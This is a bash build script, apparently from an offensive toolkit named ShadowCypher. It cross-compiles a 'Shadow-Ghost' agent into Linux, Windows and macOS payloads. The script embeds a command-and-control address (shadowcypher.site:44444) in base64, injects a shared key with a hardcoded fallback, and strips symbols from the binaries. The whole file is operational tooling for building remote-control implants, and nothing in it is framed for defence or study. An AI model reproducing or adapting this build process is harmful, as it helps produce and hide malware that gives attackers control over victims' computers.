#!/bin/bash
# --- SHADOWCYPHER AGENT BUILD SCRIPT ---
# Cross-compiling the Shadow-Ghost Agent for all major offensive targets.

echo "[*] Compiling Enterprise Shadow Node Agents..."

AGENT_DIR="/home/jack/ShadowCypher/shadowcypher/native/ghost"
OUTPUT_DIR="/home/jack/ShadowCypher/payloads/ghost"
mkdir -p $OUTPUT_DIR

# Using Sovereign-Go Runtime
export PATH="/home/jack/ShadowCypher/bin/go/bin:$PATH"

if [ -f "/etc/shadowcypher/master.key" ]; then
    MASTER_KEY=$(cat /etc/shadowcypher/master.key | head -c 32)
else
    MASTER_KEY="shadow_default_secret_32bytes_!!"
    echo "[!] WARNING: /etc/shadowcypher/master.key not found. Using fallback key for testing."
fi

C2_ADDR="shadowcypher.site:44444"
C2_B64=$(echo -n "$C2_ADDR" | base64)

export LDFLAGS="-s -w -X main.sharedKeyString=$MASTER_KEY -X main.c2Encoded=$C2_B64"

echo "[*] Forging [Linux_x64]..."
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="$LDFLAGS" -o $OUTPUT_DIR/ghost_linux_x64 $AGENT_DIR/agent.go

echo "[*] Forging [Windows_x64]..."
GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="$LDFLAGS" -o $OUTPUT_DIR/ghost_win_x64.exe $AGENT_DIR/agent.go

echo "[*] Forging [macOS_x64]..."
GOOS=darwin GOARCH=amd64 go build -trimpath -ldflags="$LDFLAGS" -o $OUTPUT_DIR/ghost_mac_x64 $AGENT_DIR/agent.go

echo "[*] Compilation complete. Agents written to ${OUTPUT_DIR}"
ls -lh $OUTPUT_DIR
